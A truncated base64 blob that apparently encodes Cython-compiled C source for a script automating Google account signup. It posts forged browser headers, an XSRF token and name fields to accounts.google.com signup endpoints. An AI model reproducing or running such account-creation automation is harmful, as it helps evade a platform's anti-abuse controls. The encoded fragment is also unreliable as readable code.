3B5eF90XzUpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF85ID0gMTtcbiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkge1xuICAgICAgICBfX3B5eF90XzYgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF82KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzkgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAxIDogMCldID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ25pbn07XG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE0MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlMywgX19weXhfdF84LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE0MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE0MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgfVxuICAgICAgX19weXhfdl9yZXMxID0gX19weXhfdF83O1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzYgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE0NSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlYXJjaCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxNDUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JlczEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTQ2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19weXhfdF85ID0gMTtcbiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzEwKSkpIHtcbiAgICAgICAgX19weXhfdF82ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xMCk7XG4gICAgICAgIGFzc2VydChfX3B5eF90XzYpO1xuICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTApO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xMCwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgIH1cbiAgICAgICNlbmRpZlxuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2RhdGFfaW5pdGlhbF9zZXR1cF9kYXRhX251bGxfbnVsLCBfX3B5eF90XzR9O1xuICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgzLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxNDUsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNSA9IF9fcHl4X3RfODtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzJ9O1xuICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ3JvdXAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxNDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3ZfdG9rID0gX19weXhfdF83O1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE0OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSG9zdF9HQVBTLCBfX3B5eF92X2hvc3QpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQ4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fcHl4X3ZfY29va2llcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7XG4gICAgICBfX3B5eF90XzcgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTUxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F1dGhvcml0eSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE1MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWNjZXB0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE1MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FjY2VwdF9sYW5ndWFnZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9lbl9VU19lbl9xXzBfOSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9jb250ZW50X3R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTUxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ29vZ2xlX2FjY291bnRzX3hzcmYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29yaWdpbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE1MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVmZXJlciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNTEsIF9fcHl4X0wzX2Vycm9yKVxuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZ2IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTU4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fcHl4X3RfOSA9IDE7XG4gICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xMCkpKSB7XG4gICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTApO1xuICAgICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEwKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTAsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07XG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTU4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICB9XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3VzZXJfYWdlbnQsIF9fcHl4X3RfOCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICBfX3B5eF92X2hlYWRlcnMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE2MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3RvaywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE2MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShfX3B5eF92X24xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDE2MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShfX3B5eF92X24yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTYxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoX19weXhfdl9uMSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE2MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5VW5pY29kZV9Vbmljb2RlKF9fcHl4X3ZfbjIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNjEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzExWzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNDtcbiAgICAgIF9fcHl4X3RfMTFbMV0gPSBfX3B5eF90Xzg7XG4gICAgICBfX3B5eF90XzExWzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNTtcbiAgICAgIF9fcHl4X3RfMTFbM10gPSBfX3B5eF90XzEwO1xuICAgICAgX19weXhfdF8xMVs0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzU7XG4gICAgICBfX3B5eF90XzExWzVdID0gX19weXhfdF81O1xuICAgICAgX19weXhfdF8xMVs2XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzU7XG4gICAgICBfX3B5eF90XzExWzddID0gX19weXhfdF80O1xuICAgICAgX19weXhfdF8xMVs4XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzU7XG4gICAgICBfX3B5eF90XzExWzldID0gX19weXhfdF82O1xuICAgICAgX19weXhfdF8xMVsxMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzBfMF9udWxsX251bGxfd2ViX2dsaWZfc2lnbnVwXzA7XG4gICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xMSwgMTEsIDIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzgpICsgMyAqIDQgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEwKSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNSkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzQpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF82KSArIDQ4LCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF84KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzEwKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzUpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF82KSk7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTYxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZl9yZXEsIF9fcHl4X3RfMTIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTYxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGV2aWNlaW5mbywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9udWxsX251bGxfbnVsbF9udWxsX251bGxfTkxfbnVsKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzEyID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzkgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNCkpKSB7XG4gICAgICAgIF9fcHl4X3RfMTIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF8xMik7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF80KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzQsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDMgOiAwKV0gPSB7X19weXhfdF8xMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbn07XG4gICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE2NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb29raWVzLCBfX3B5eF92X2Nvb2tpZXMsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNik7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE2NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgfVxuICAgICAgX19weXhfdl9yZXNwb25zZSA9IF9fcHl4X3RfNztcbiAgICAgIF9fcHl4X3RfNyA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGV4dCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE3MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAxNzAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX3B5eF90XzYgPSBQeVVuaWN